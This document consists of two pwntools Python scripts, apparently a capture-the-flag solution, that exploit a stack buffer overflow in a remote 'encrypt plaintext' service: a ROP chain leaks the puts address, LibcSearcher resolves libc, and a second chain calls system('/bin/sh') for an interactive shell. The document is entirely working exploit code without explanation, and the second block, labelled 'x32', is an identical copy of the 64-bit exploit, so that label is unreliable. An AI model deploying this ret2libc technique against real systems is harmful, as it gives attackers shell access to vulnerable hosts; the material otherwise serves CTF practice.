``` python
# x64
from pwn import *
from LibcSearcher import *
r = remote('node5.anna.nssctf.cn', 24137)
# r = process('./pwn1')
context.log_level = 'debug'

# r = process('./pwn1')
e = ELF('./pwn1')
# context.terminal = ['x-terminal-emulator', '-x', 'sh', '-c']
# gdb.attach(proc.pidof(r)[0])
# context.log_level='debug'
# print("pid" + str(proc.pidof(r)))

ret = 0x00000000004006b9
pop_rdi = 0x0000000000400c83
main = e.symbols['main']
puts_got = e.got['puts']
puts_plt = e.plt['puts']

payload = b'\0' + b'a' * (0x50 - 1) + b'b' * 0x8
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

r.sendlineafter(b'Input your choice!\n', b'1')

r.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)

r.recvline()
r.recvline()

puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(0x8, b'\x00'))
print(hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)

libc_base = puts_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

payload = b'\x00' + b'a' * (0x50 - 1) + b'b' * 8 
payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)

r.sendlineafter(b'Input your choice!\n', b'1')

r.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)

r.interactive()
```

``` python
# x32
from pwn import *
from LibcSearcher import *
r = remote('node5.anna.nssctf.cn', 24137)
# r = process('./pwn1')
context.log_level = 'debug'

# r = process('./pwn1')
e = ELF('./pwn1')
# context.terminal = ['x-terminal-emulator', '-x', 'sh', '-c']
# gdb.attach(proc.pidof(r)[0])
# context.log_level='debug'
# print("pid" + str(proc.pidof(r)))

ret = 0x00000000004006b9
pop_rdi = 0x0000000000400c83
main = e.symbols['main']
puts_got = e.got['puts']
puts_plt = e.plt['puts']

payload = b'\0' + b'a' * (0x50 - 1) + b'b' * 0x8
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

r.sendlineafter(b'Input your choice!\n', b'1')

r.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)

r.recvline()
r.recvline()

puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(0x8, b'\x00'))
print(hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)

libc_base = puts_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

payload = b'\x00' + b'a' * (0x50 - 1) + b'b' * 8 
payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)

r.sendlineafter(b'Input your choice!\n', b'1')

r.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)

r.interactive()

```
